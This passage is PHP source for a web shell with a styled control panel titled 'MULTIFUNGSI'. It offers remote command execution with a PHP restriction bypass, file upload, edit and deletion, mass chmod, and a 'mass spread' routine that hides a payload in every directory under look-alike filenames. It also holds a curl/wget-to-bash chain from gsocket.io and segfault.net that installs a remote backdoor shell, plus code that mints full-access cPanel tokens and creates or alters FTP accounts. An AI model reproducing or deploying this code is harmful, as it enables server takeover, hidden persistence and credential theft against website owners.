        fixPermission(dirname($file));
        return @file_put_contents($file, $_POST['content']) !== false;
    }
    return false;
}

function uploadFile($targetDirectory) {
    if (isset($_FILES['file'])) {
        fixPermission($targetDirectory);
        $targetFile = $targetDirectory . '/' . basename($_FILES['file']['name']);
        if ($_FILES['file']['size'] === 0) return 'Empty file.';
        if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) return 'File uploaded successfully.';
        return 'Error uploading file.';
    }
    return '';
}

function uploadMultipleFiles($targetDirectory) {
    if (!isset($_FILES['files'])) return 'No files selected.';
    fixPermission($targetDirectory);
    $success = 0; $fail = 0;
    for ($i = 0; $i < count($_FILES['files']['name']); $i++) {
        if ($_FILES['files']['error'][$i] === 0 && !empty($_FILES['files']['name'][$i])) {
            $target = $targetDirectory . '/' . basename($_FILES['files']['name'][$i]);
            if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $target)) $success++;
            else $fail++;
        }
    }
    return "Uploaded: $success, Failed: $fail";
}

function getCurrentDirectory() { return realpath(getcwd()); }

function deleteFile($file) {
    fixPermission($file);
    fixPermission(dirname($file));
    if (file_exists($file)) {
        if (is_dir($file)) return deleteFolder($file);
        if (@unlink($file)) return true;
    }
    return false;
}

function deleteFolder($folder) {
    fixPermission($folder);
    if (is_dir($folder)) {
        $items = @scandir($folder);
        if (is_array($items)) {
            foreach ($items as $item) {
                if ($item == '.' || $item == '..') continue;
                $path = $folder . '/' . $item;
                fixPermission($path);
                if (is_dir($path)) deleteFolder($path);
                else @unlink($path);
            }
        }
        return @rmdir($folder);
    }
    return false;
}

function renameFile($oldName, $newName) {
    fixPermission($oldName);
    fixPermission(dirname($oldName));
    if (file_exists($oldName)) {
        $directory = dirname($oldName);
        $newPath = $directory . '/' . $newName;
        
        if (file_exists($newPath) && $newPath !== $oldName) {
            return 'File already exists: ' . $newName;
        }
        
        if (@rename($oldName, $newPath)) {
            return 'success';
        }
        return 'Error renaming file.';
    }
    return 'File does not exist.';
}

function scanDeepestDirectory($basePath) {
    $deepest = []; $maxDepth = 0;
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iterator as $item) {
            if ($item->isDir()) {
                $depth = $iterator->getDepth();
                if ($depth > $maxDepth) { $maxDepth = $depth; $deepest = [$item->getPathname()]; }
                elseif ($depth == $maxDepth) { $deepest[] = $item->getPathname(); }
            }
        }
    } catch (Exception $e) {}
    return $deepest;
}

function scanNewlyFiles($basePath, $ext = 'php', $limit = 50) {
    $files = [];
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS)
        );
        foreach ($iterator as $item) {
            if ($item->isFile() && strtolower($item->getExtension()) === $ext) {
                $files[] = ['path' => $item->getPathname(), 'time' => $item->getMTime()];
            }
        }
    } catch (Exception $e) {}
    usort($files, function($a, $b) { return $b['time'] - $a['time']; });
    return array_slice($files, 0, $limit);
}

function generateHomoglyph($filename) {
    $name = pathinfo($filename, PATHINFO_FILENAME);
    $ext = pathinfo($filename, PATHINFO_EXTENSION);
    $map = [
        'a' => ['@','4'],
        'e' => ['3'],
        'i' => ['1','l'],
        'o' => ['0'],
        's' => ['5'],
        'l' => ['1','I'],
        'g' => ['9'],
        'c' => ['('],
        't' => ['7'],
        'I' => ['l','1'],
        'O' => ['0'],
        'S' => ['5'],
        'A' => ['4','@'],
        'E' => ['3'],
        'B' => ['8'],
        'G' => ['6'],
        'T' => ['7'],
    ];
    $variants = [];
    $len = strlen($name);
    for ($i = 0; $i < $len; $i++) {
        $ch = $name[$i];
        if (isset($map[$ch])) {
            foreach ($map[$ch] as $rep) {
                $v = substr($name, 0, $i) . $rep . substr($name, $i + 1);
                $full = $ext ? $v . '.' . $ext : $v;
                if ($full !== $filename) $variants[] = $full;
            }
        }
    }
    if (empty($variants)) {
        $variants[] = '.' . $filename;
        $variants[] = $name . '_bak.' . $ext;
    }
    return array_unique($variants);
}

function massSpreadAuto($basePath, $content) {
    $count = 0; $errors = []; $created = [];
    $targetExts = ['php'];
    try {
        fixPermission($basePath);
        $dirs = [$basePath];
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iterator as $item) {
            if ($item->isDir()) $dirs[] = $item->getPathname();
        }
        foreach ($dirs as $dir) {
            fixPermission($dir);
            $files = @scandir($dir);
            if (!is_array($files)) { $errors[] = $dir; continue; }
            $existingFiles = [];
            foreach ($files as $f) {
                if ($f === '.' || $f === '..') continue;
                if (is_file($dir . '/' . $f)) {
                    $fext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
                    if (in_array($fext, $targetExts)) $existingFiles[] = $f;
                }
            }
            if (empty($existingFiles)) {
                $existingFiles = ['index.php', 'config.php', 'class-loader.php'];
            }
            $placed = false;
            foreach ($existingFiles as $origFile) {
                $variants = generateHomoglyph($origFile);
                foreach ($variants as $variant) {
                    $targetPath = $dir . '/' . $variant;
                    if (!file_exists($targetPath)) {
                        if (@file_put_contents($targetPath, $content) !== false) {
                            $count++;
                            $created[] = $targetPath;
                            $placed = true;
                            break 2;
                        }
                    }
                }
            }
            if (!$placed) $errors[] = $dir;
        }
    } catch (Exception $e) {
        $errors[] = 'Exception: ' . $e->getMessage();
    }
    return ['count' => $count, 'errors' => $errors, 'created' => $created];
}

function extractZip($filePath, $targetDir) {
    $result = ['success' => false, 'message' => 'Unknown error', 'files' => [], 'php_files' => [], 'php_files_moved' => 0];
    
    fixPermission($filePath);
    fixPermission($targetDir);
    
    $tempDir = $targetDir . '/' . 'temp_extract_' . uniqid();
    if (!is_dir($tempDir)) {
        @mkdir($tempDir, 0755, true);
    }
    
    $extractedFiles = [];
    $phpFiles = [];
    
    if (class_exists('ZipArchive')) {
        $zip = new ZipArchive();
        if ($zip->open($filePath) === true) {
            for ($i = 0; $i < $zip->numFiles; $i++) {
                $extractedFiles[] = $zip->getNameIndex($i);
            }
            
            $zip->extractTo($tempDir);
            $zip->close();
            
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($tempDir, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            
            foreach ($iterator as $item) {
                if ($item->isFile() && strtolower($item->getExtension()) === 'php') {
                    $phpFiles[] = $item->getPathname();
                }
            }
            
            $phpFilesMoved = 0;
            $phpFileNames = [];
            
            foreach ($phpFiles as $phpFile) {
                $phpFileName = basename($phpFile);
                $targetPath = $targetDir . '/' . $phpFileName;
                
                $counter = 1;
                $baseName = pathinfo($phpFileName, PATHINFO_FILENAME);
                $ext = pathinfo($phpFileName, PATHINFO_EXTENSION);
                while (file_exists($targetPath)) {
                    $targetPath = $targetDir . '/' . $baseName . '_' . $counter . '.' . $ext;
                    $counter++;
                }
                
                if (@copy($phpFile, $targetPath)) {
                    $phpFilesMoved++;
                    $phpFileNames[] = basename($targetPath);
                }
            }
            
            deleteFolder($tempDir);
            
            $result = [
                'success' => true, 
                'message' => 'ZIP extracted successfully', 
                'files' => $extractedFiles,
                'php_files' => $phpFileNames,
                'php_files_moved' => $phpFilesMoved
            ];
        } else {
            $result['message'] = 'Failed to open ZIP archive';
            if (is_dir($tempDir)) deleteFolder($tempDir);
        }
    } elseif (function_exists('exec')) {
        $cmd = "unzip -o " . escapeshellarg($filePath) . " -d " . escapeshellarg($tempDir) . " 2>&1";
        $output = runCmd($cmd);
        if (strpos($output, 'inflating') !== false || strpos($output, 'extracting') !== false) {
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($tempDir, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            
            foreach ($iterator as $item) {
                if ($item->isFile() && strtolower($item->getExtension()) === 'php') {
                    $phpFiles[] = $item->getPathname();
                }
            }
            
            $phpFilesMoved = 0;
            $phpFileNames = [];
            
            foreach ($phpFiles as $phpFile) {
                $phpFileName = basename($phpFile);
                $targetPath = $targetDir . '/' . $phpFileName;
                
                $counter = 1;
                $baseName = pathinfo($phpFileName, PATHINFO_FILENAME);
                $ext = pathinfo($phpFileName, PATHINFO_EXTENSION);
                while (file_exists($targetPath)) {
                    $targetPath = $targetDir . '/' . $baseName . '_' . $counter . '.' . $ext;
                    $counter++;
                }
                
                if (@copy($phpFile, $targetPath)) {
                    $phpFilesMoved++;
                    $phpFileNames[] = basename($targetPath);
                }
            }
            
            deleteFolder($tempDir);
            
            $result = [
                'success' => true, 
                'message' => 'ZIP extracted via unzip', 
                'php_files' => $phpFileNames,
                'php_files_moved' => $phpFilesMoved,
                'output' => $output
            ];
        } else {
            $result['message'] = 'unzip failed: ' . ($output ?: 'No output');
            if (is_dir($tempDir)) deleteFolder($tempDir);
        }
    } else {
        $result['message'] = 'ZIP extraction requires ZipArchive or exec()';
        if (is_dir($tempDir)) deleteFolder($tempDir);
    }
    
    return $result;
}

function scanExtractedFiles($dir) {
    $files = [];
    if (!is_dir($dir)) return $files;
    $items = @scandir($dir);
    if (!is_array($items)) return $files;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . '/' . $item;
        if (is_dir($path)) {
            $subFiles = scanExtractedFiles($path);
            foreach ($subFiles as $sub) {
                $files[] = $item . '/' . $sub;
            }
        } else {
            $files[] = $item;
        }
    }
    return $files;
}

if (isset($_POST['extract_zip']) && !empty($_POST['extract_zip'])) {
    $filePath = $_POST['extract_zip'];
    $targetDir = isset($_POST['extract_target']) ? $_POST['extract_target'] : $currentDirectory;
    
    if (file_exists($filePath)) {
        $result = extractZip($filePath, $targetDir);
        if ($result['success']) {
            $responseMessage = '✅ Extraction successful!';
            if ($result['php_files_moved'] > 0) {
                $responseMessage .= ' ' . $result['php_files_moved'] . ' PHP file(s) extracted: ' . implode(', ', $result['php_files']);
            } else {
                $responseMessage .= ' No PHP files found in the archive.';
            }
            $cmdOutput = "=== Extraction Result ===\n";
            $cmdOutput .= "Archive: " . basename($filePath) . "\n";
            $cmdOutput .= "PHP files found: " . $result['php_files_moved'] . "\n";
            if ($result['php_files_moved'] > 0) {
                $cmdOutput .= "Files extracted:\n";
                foreach ($result['php_files'] as $f) {
                    $cmdOutput .= "  - " . $f . "\n";
                }
            }
            if (!empty($result['output'])) {
                $cmdOutput .= "\nCommand output:\n" . $result['output'];
            }
        } else {
            $errorMessage = '❌ Extraction failed: ' . $result['message'];
        }
    } else {
        $errorMessage = '❌ File not found: ' . basename($filePath);
    }
}

$currentDirectory = getCurrentDirectory();
$errorMessage = '';
$responseMessage = '';
$cmdOutput = '';

if (isset($_GET['lph'])) {
    @chdir($_GET['lph']);
    $currentDirectory = getCurrentDirectory();
}

if (isset($_POST['multi_upload'])) {
    $responseMessage = uploadMultipleFiles($currentDirectory);
}

if (isset($_POST['newfolder']) && !empty($_POST['foldername'])) {
    $newDir = $currentDirectory . '/' . $_POST['foldername'];
    fixPermission($currentDirectory);
    if (@mkdir($newDir, 0755)) $responseMessage = 'Folder created.';
    else $responseMessage = 'Failed to create folder.';
}

if (isset($_POST['newfile']) && !empty($_POST['newfilename'])) {
    $newFile = $currentDirectory . '/' . $_POST['newfilename'];
    fixPermission($currentDirectory);
    if (!file_exists($newFile)) {
        if (@file_put_contents($newFile, '') !== false) {
            $responseMessage = 'File created: ' . htmlspecialchars($_POST['newfilename']);
        } else {
            $errorMessage = 'Failed to create file.';
        }
    } else {
        $errorMessage = 'File already exists.';
    }
}

if (isset($_POST['mass_chmod']) && !empty($_POST['chmod_folder']) && !empty($_POST['chmod_file'])) {
    $folderPerm = $_POST['chmod_folder'];
    $filePerm = $_POST['chmod_file'];
    $targetPath = !empty($_POST['chmod_path']) ? $_POST['chmod_path'] : $currentDirectory;
    $folderCount = 0; $fileCount = 0; $chmodErrors = [];
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iterator as $item) {
            $path = $item->getPathname();
            if ($item->isDir()) {
                if (@chmod($path, octdec($folderPerm))) $folderCount++;
                else $chmodErrors[] = $path;
            } else {
                if (@chmod($path, octdec($filePerm))) $fileCount++;
                else $chmodErrors[] = $path;
            }
        }
        @chmod($targetPath, octdec($folderPerm));
        $folderCount++;
        $cmdOutput = "=== Mass Chmod Result ===\nTarget: $targetPath\nFolder Perm: $folderPerm\nFile Perm: $filePerm\n---\nFolders: $folderCount\nFiles: $fileCount";
        if (count($chmodErrors) > 0) {
            $cmdOutput .= "\nErrors: " . count($chmodErrors);
            foreach (array_slice($chmodErrors, 0, 5) as $err) $cmdOutput .= "\n  $err";
        }
        $responseMessage = 'Mass chmod completed.';
    } catch (Exception $e) {
        $cmdOutput = "Error: " . $e->getMessage();
    }
}

if (isset($_POST['mass_spread']) && !empty($_POST['spread_content'])) {
    $spreadContent = $_POST['spread_content'];
    $result = massSpreadAuto($currentDirectory, $spreadContent);
    $cmdOutput = "=== Mass Spread Result ===\nStarting from: $currentDirectory\nFiles created: " . $result['count'];
    if (count($result['created']) > 0) {
        $cmdOutput .= "\n\nCreated files:";
        foreach (array_slice($result['created'], 0, 20) as $c) $cmdOutput .= "\n  " . basename($c) . " -> " . dirname($c);
    }
    if (count($result['errors']) > 0) {
        $cmdOutput .= "\n\nFailed dirs: " . count($result['errors']);
        foreach (array_slice($result['errors'], 0, 5) as $err) $cmdOutput .= "\n  $err";
    }
    $responseMessage = 'Mass spread completed: ' . $result['count'] . ' files created.';
}

if (isset($_POST['gsocket_action']) && isset($_POST['gsocket_cmd'])) {
    $gsCmd = $_POST['gsocket_cmd'];
    $cmdOutput = "=== GSSocket ===\n\n";

    if ($gsCmd === 'install') {
        $out = runCmd('curl -fsSL https://gsocket.io/y | bash');
        if (!empty(trim($out ?? ''))) {
            $cmdOutput .= "[1] gsocket.io (curl):\n" . $out;
        } else {
            $out = runCmd('wget --no-verbose -O- https://gsocket.io/y | bash');
            if (!empty(trim($out ?? ''))) {
                $cmdOutput .= "[1] gsocket.io (wget):\n" . $out;
            } else {
                $cmdOutput .= "[1] gsocket.io: No output.\n";
            }
        }
        $out2 = runCmd('curl -fsSL http://nossl.segfault.net/deploy-all.sh -o /tmp/deploy-all.sh && bash /tmp/deploy-all.sh');
        if (!empty(trim($out2 ?? ''))) {
            $cmdOutput .= "\n\n[2] segfault.net deploy:\n" . $out2;
        } else {
            $cmdOutput .= "\n\n[2] segfault.net deploy: No output.";
        }
        $out3 = runCmd('GS_PORT=53 bash /tmp/deploy-all.sh');
        if (!empty(trim($out3 ?? ''))) {
            $cmdOutput .= "\n\n[3] GS_PORT=53 deploy:\n" . $out3;
        } else {
            $cmdOutput .= "\n\n[3] GS_PORT=53 deploy: No output.";
        }
        @unlink('/tmp/deploy-all.sh');
        runCmd('rm -f /tmp/deploy-all.sh');
        $responseMessage = 'GSSocket install chain executed.';

    } elseif ($gsCmd === 'uninstall') {
        $out = runCmd('GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1');
        if (empty(trim($out ?? ''))) {
            $out = runCmd('GS_UNDO=1 bash -c "$(wget --no-verbose -O- https://gsocket.io/y)" 2>&1');
        }
        runCmd('pkill -u $(whoami) 2>/dev/null');
        runCmd('rm -f /tmp/deploy-all.sh');
        $out = preg_replace('/-->.*pkill defunct.*/i', '', $out ?? '');
        $out = trim($out);
        $out .= "\nAll user processes killed.";
        $cmdOutput .= $out;
        $responseMessage = 'GSSocket uninstall executed.';
    }
}

if (isset($_POST['cpanel_token'])) {
    $randomName = 'lp' . substr(md5(uniqid(mt_rand(), true)), 0, 8);
    $uapiOutput = runUapi('Tokens create_full_access name=' . $randomName);
    $serverDomain = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'unknown';
    $serverDomain = preg_replace('/^https?:\/\//', '', $serverDomain);
    $serverDomain = rtrim($serverDomain, '/');
    $serverUser = trim(runCmd('whoami') ?? get_current_user());
    $token = '';
    if ($uapiOutput && preg_match('/token:\s*[\'"]?([A-Z0-9]+)[\'"]?/i', $uapiOutput, $m)) {
        $token = $m[1];
    }
    $cmdOutput = "=== cPanel Token Generated ===\n\n";
    if (!empty($token)) {
        $cmdOutput .= "Login   : https://" . $serverDomain . ":2083/\n";
        $cmdOutput .= "Domain  : " . $serverDomain . "\n";
        $cmdOutput .= "User    : " . $serverUser . "\n";
        $cmdOutput .= "Token   : " . $token . "\n";
        $cmdOutput .= "\n=== Copy Format ===\n";
        $cmdOutput .= $serverDomain . "|" . $serverUser . "|" . $token;
        $responseMessage = 'cPanel token created successfully';
    } else {
        $cmdOutput .= "FAILED to create token.\n\n";
        $cmdOutput .= "Raw output:\n" . ($uapiOutput ?: 'No output from uapi');
        $responseMessage = 'Token creation failed';
    }
}

$ftpAccounts = [];
if (isset($_POST['ftp_list']) || isset($_POST['ftp_add']) || isset($_POST['ftp_passwd']) || isset($_POST['ftp_delete'])) {
    $ftpListRaw = runUapi('Ftp list_ftp');
    $ftpAccounts = parseUapiFtpList($ftpListRaw);
}

if (isset($_POST['ftp_list'])) {
    $responseMessage = count($ftpAccounts) . ' FTP account(s) found.';
}

if (isset($_POST['ftp_add']) && !empty($_POST['ftp_user']) && !empty($_POST['ftp_pass'])) {
    $ftpUser = $_POST['ftp_user'];
    $ftpPass = $_POST['ftp_pass'];
    $ftpQuota = !empty($_POST['ftp_quota']) ? $_POST['ftp_quota'] : '0';
    $homeDir = getenv('HOME') ?: ('/home/' . get_current_user());
    $addOutput = runUapi('Ftp add_ftp user=' . escapeshellarg($ftpUser) . ' pass=' . escapeshellarg($ftpPass) . ' quota=' . escapeshellarg($ftpQuota) . ' homedir=' . escapeshellarg($homeDir));
    $parsed = parseUapiStatus($addOutput);
    if ($parsed['ok']) {
        $responseMessage = 'FTP account "' . $ftpUser . '" created successfully.';
    } else {
        $errorMessage = 'FTP creation failed. Check output.';
        $cmdOutput = $addOutput;
    }
}

if (isset($_POST['ftp_passwd']) && !empty($_POST['ftp_chg_user']) && !empty($_POST['ftp_chg_pass']) && !empty($_POST['ftp_chg_domain'])) {
    $chgUser = $_POST['ftp_chg_user'];
    $chgPass = $_POST['ftp_chg_pass'];
    $chgDomain = $_POST['ftp_chg_domain'];
    $passwdOutput = runUapi('Ftp passwd user=' . escapeshellarg($chgUser) . ' domain=' . escapeshellarg($chgDomain) . ' pass=' . escapeshellarg($chgPass));
    $parsed = parseUapiStatus($passwdOutput);
    if ($parsed['ok']) {
        $responseMessage = 'Password changed for "' . $chgUser . '@' . $chgDomain . '".';
    } else {
        $errorMessage = 'Password change failed.';
        $cmdOutput = $passwdOutput;
    }
}

if (isset($_POST['ftp_delete']) && !empty($_POST['ftp_del_user']) && !empty($_POST['ftp_del_domain'])) {
    $delUser = $_POST['ftp_del_user'];
    $delDomain = $_POST['ftp_del_domain'];
    $delOutput = runUapi('Ftp delete_ftp user=' . escapeshellarg($delUser) . ' domain=' . escapeshellarg($delDomain));
    $parsed = parseUapiStatus($delOutput);
    if ($parsed['ok']) {
        $responseMessage = 'FTP account "' . $delUser . '@' . $delDomain . '" deleted.';
    } else {
        $errorMessage = 'FTP deletion failed.';
        $cmdOutput = $delOutput;
    }
}

$wpAvailable = false;
$wpLoadPath = findWpLoad();
if ($wpLoadPath) $wpAvailable = true;

if (isset($_POST['remote_upload']) && !empty($_POST['remote_url'])) {
    $url = $_POST['remote_url'];
    $fname = !empty($_POST['remote_filename']) ? $_POST['remote_filename'] : basename(parse_url($url, PHP_URL_PATH));
    $target = $currentDirectory . '/' . $fname;
    fixPermission($currentDirectory);
    $content = @file_get_contents($url);
    if ($content === false && function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>true,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_TIMEOUT=>30,CURLOPT_SSL_VERIFYPEER=>false]);
        $content = curl_exec($ch); curl_close($ch);
    }
    if ($content !== false && @file_put_contents($target, $content) !== false) $responseMessage = "Remote file downloaded: $fname";
    else $responseMessage = 'Failed to download remote file.';
}

if (isset($_GET['edit'])) {
    $file = $_GET['edit'];
    $content = readFileContent($file);
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
        if (saveFileContent($file)) $responseMessage = 'File saved.';
        else $errorMessage = 'Error saving file.';
    }
}

if (isset($_GET['chmod'])) {
    $file = $_GET['chmod'];
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['permission'])) {
        $perm = intval($_POST['permission'], 8);
        if ($perm > 0 && @chmod($file, $perm)) $responseMessage = 'Permission changed.';
        else $errorMessage = 'Error changing permission.';
    }
}

if (isset($_POST['upload'])) {
    $responseMessage = uploadFile($currentDirectory);
}

if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
    $useBypass = isset($_POST['use_bypass']) && $_POST['use_bypass'] === '1';
    if ($useBypass) {
        $bypassOut = runBypass($_POST['cmd']);
        $cmdOutput = $bypassOut ?: 'Bypass returned no output. UAF may not work on this PHP version.';
    } else {
        $cmdOutput = executeCommand($_POST['cmd']);
    }
}

if (isset($_POST['eclipse']) && !empty($_POST['eclipse'])) {
    $bypassOut = runBypass($_POST['eclipse']);
    $cmdOutput = $bypassOut ?: 'Bypass returned no output. UAF may not work on this PHP version.';
}

if (isset($_GET['rename']) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_name'])) {
    $file = $_GET['rename'];
    $newName = trim($_POST['new_name']);
    $result = renameFile($file, $newName);
    
    if ($result === 'success') {
        $dir = dirname($file);
        header('Location: ?lph=' . urlencode($dir) . '&msg=renamed&old=' . urlencode(basename($file)) . '&new=' . urlencode($newName));
        exit;
    } else {
        $errorMessage = $result;
    }
}

if (isset($_POST['Summon'])) {
    $url = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
    $filePath = $currentDirectory . '/Adminer.php';
    $fileContent = @file_get_contents($url);
    if ($fileContent !== false && @file_put_contents($filePath, $fileContent) !== false) {
        $responseMessage = 'Adminer summoned successfully.';
    } else {
        $errorMessage = 'Failed to summon Adminer.';
    }
}

if (isset($_POST['scan_deeply'])) {
    $results = scanDeepestDirectory($currentDirectory);
    $cmdOutput = "=== Deepest Directories ===\n";
    if (empty($results)) $cmdOutput .= "No subdirectories found.";
    else foreach ($results as $r) $cmdOutput .= $r . "\n";
}

if (isset($_POST['scan_newly'])) {
    $ext = isset($_POST['scan_ext']) ? $_POST['scan_ext'] : 'php';
    $results = scanNewlyFiles($currentDirectory, $ext);
    $cmdOutput = "=== Newest .$ext Files ===\n";
    if (empty($results)) $cmdOutput .= "No files found.";
    else foreach ($results as $r) $cmdOutput .= date('Y-m-d H:i:s', $r['time']) . " | " . $r['path'] . "\n";
}

if (isset($_GET['msg']) && $_GET['msg'] === 'deleted') {
    $responseMessage = '✅ Item deleted successfully.';
}

if (isset($_GET['msg']) && $_GET['msg'] === 'delete_failed') {
    $errorMessage = '❌ Failed to delete item.';
}

if (isset($_GET['msg']) && $_GET['msg'] === 'invalid_path') {
    $errorMessage = '❌ Invalid path for deletion.';
}

if (isset($_GET['msg']) && $_GET['msg'] === 'renamed') {
    $oldName = isset($_GET['old']) ? htmlspecialchars(urldecode($_GET['old'])) : 'file';
    $newName = isset($_GET['new']) ? htmlspecialchars(urldecode($_GET['new'])) : 'file';
    $responseMessage = '✅ File renamed successfully: <span style="color:var(--accent-red);">' . $oldName . '</span> → <span style="color:var(--accent-green);font-weight:700;">' . $newName . '</span>';
}

if (function_exists('litespeed_request_headers')) {
    $headers = litespeed_request_headers();
    if (isset($headers['X-LSCACHE'])) header('X-LSCACHE: off');
}

if (isset($_FILES['zip_file']) && $_FILES['zip_file']['error'] === 0) {
    $zipPath = $currentDirectory . '/' . basename($_FILES['zip_file']['name']);
    if (move_uploaded_file($_FILES['zip_file']['tmp_name'], $zipPath)) {
        $result = extractZip($zipPath, $currentDirectory);
        if ($result['success']) {
            $responseMessage = '✅ ZIP extracted successfully!';
            if ($result['php_files_moved'] > 0) {
                $responseMessage .= ' ' . $result['php_files_moved'] . ' PHP file(s) extracted: ' . implode(', ', $result['php_files']);
            } else {
                $responseMessage .= ' No PHP files found in the archive.';
            }
            $cmdOutput = "=== ZIP Extraction ===\nArchive: " . basename($zipPath) . "\nPHP files found: " . $result['php_files_moved'] . "\n";
            if ($result['php_files_moved'] > 0) {
                $cmdOutput .= "Files extracted:\n";
                foreach ($result['php_files'] as $f) {
                    $cmdOutput .= "  - " . $f . "\n";
                }
            }
        } else {
            $errorMessage = '❌ ' . $result['message'];
        }
    } else {
        $errorMessage = '❌ Failed to upload ZIP file';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>👨‍💻MULTIFUNGSI</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
:root {
    --bg-primary: #070b1a;
    --bg-secondary: #0c1428;
    --bg-card: rgba(17, 29, 58, 0.85);
    --bg-card-hover: rgba(22, 42, 74, 0.9);
    --bg-input: rgba(10, 20, 40, 0.85);
    --border-color: rgba(26, 45, 80, 0.7);
    --border-light: rgba(42, 64, 104, 0.7);
    --text-primary: #ffffff;
    --text-secondary: #e0e6f0;
    --text-muted: #a0b0cc;
    --accent-gold: #f0b90b;
    --accent-gold-dark: #c99a08;

    --accent-blue: #4a9eff;
    --accent-green: #3fb950;
    --accent-red: #f85149;
    --accent-purple: #a855f7;
    --accent-pink: #ec4899;
    --accent-orange: #f97316;
    --accent-cyan: #06b6d4;
    --shadow-glow: 0 0 60px rgba(74, 158, 255, 0.06);
    --glass-bg: rgba(17, 29, 58, 0.85);
    --gradient-gold: linear-gradient(135deg, #f0b90b, #f59e0b);
    --gradient-blue: linear-gradient(135deg, #4a9eff, #2563eb);
    --gradient-purple: linear-gradient(135deg, #a855f7, #7c3aed);
    --gradient-pink: linear-gradient(135deg, #ec4899, #db2777);
    --gradient-cyan: linear-gradient(135deg, #06b6d4, #0891b2);
}

* { margin: 0; padding: 0; box-sizing: border-box; }

body {
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
    font-size: 13px;
    background: var(--bg-primary);
    color: var(--text-primary);
    min-height: 100vh;
    background-image: url('https://ik.imagekit.io/nehadee/backgroud%20bajakteam168.png?updatedAt=1785966064305');
    background-size: 1920px 1080px;
    background-position: center center;
    background-repeat: no-repeat;
    background-attachment: fixed;
    background-color: var(--bg-primary);
}

body::before {
    content: '';
    position: fixed;
    inset: 0;
    background: rgba(7, 11, 26, 0.20);
    z-index: -1;
}

::-webkit-scrollbar { width: 5px; height: 5px; }
::-webkit-scrollbar-track { background: var(--bg-secondary); }
::-webkit-scrollbar-thumb { background: var(--border-color); border-radius: 3px; }
::-webkit-scrollbar-thumb:hover { background: var(--border-light); }

.app-header {
    background: var(--glass-bg);
    backdrop-filter: blur(25px);
    -webkit-backdrop-filter: blur(25px);
    border-bottom: 1px solid var(--border-color);
    padding: 12px 24px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    position: sticky;
    top: 0;
    z-index: 100;
}

.header-left { display: flex; align-items: center; gap: 14px; }

.header-title-group { display: flex; flex-direction: column; }

.header-title {
    font-size: 28px;
    font-weight: 900;
    background: linear-gradient(135deg, #a855f7, #4a9eff, #f97316, #ec4899, #10b981);
    background-size: 300% 300%;
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    letter-spacing: 2px;
    font-family: 'Inter', sans-serif;
    animation: gradientShift 4s ease-in-out infinite, textPulse 2s ease-in-out infinite;
    text-shadow: none;
    position: relative;
    display: inline-block;
}

@keyframes gradientShift {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
}

@keyframes textPulse {
    0%, 100% { opacity: 1; transform: scale(1); }
    25% { opacity: 0.5; transform: scale(0.97); }
    50% { opacity: 1; transform: scale(1.03); }
    75% { opacity: 0.5; transform: scale(0.97); }
}

.header-sub {
    font-size: 10px;
    color: var(--text-secondary);
    letter-spacing: 2px;
    text-transform: uppercase;
    font-weight: 400;
    margin-top: -2px;
    opacity: 0.7;
}

.header-right { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }

.sys-badge {
    background: var(--bg-input);
    border: 1px solid var(--border-color);
    padding: 4px 14px;
    border-radius: 20px;
    font-size: 10px;
    color: var(--text-secondary);
    font-weight: 500;
    display: flex;
    align-items: center;
    gap: 6px;
}
.sys-badge .dot {
    width: 7px;
    height: 7px;
    border-radius: 50%;
    display: inline-block;
    animation: pulse-dot 2s infinite;
}
.sys-badge .dot.green { background: var(--accent-green); }
.sys-badge .dot.blue { background: var(--accent-blue); }
@keyframes pulse-dot {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.4; }
}

.container { max-width: 1400px; margin: 0 auto; padding: 16px 20px; }

.breadcrumb {
    background: var(--bg-card);
    border: 1px solid var(--border-color);
    border-radius: 12px;
    padding: 12px 20px;
    margin-bottom: 16px;
    font-size: 12px;
    overflow-x: auto;
    white-space: nowrap;
    display: flex;
    align-items: center;
    gap: 6px;
}
.breadcrumb .label {
    color: var(--text-muted);
    font-weight: 700;
    font-size: 9px;
    text-transform: uppercase;
    letter-spacing: 0.8px;
    margin-right: 6px;
}
.breadcrumb a {
    color: var(--accent-blue);
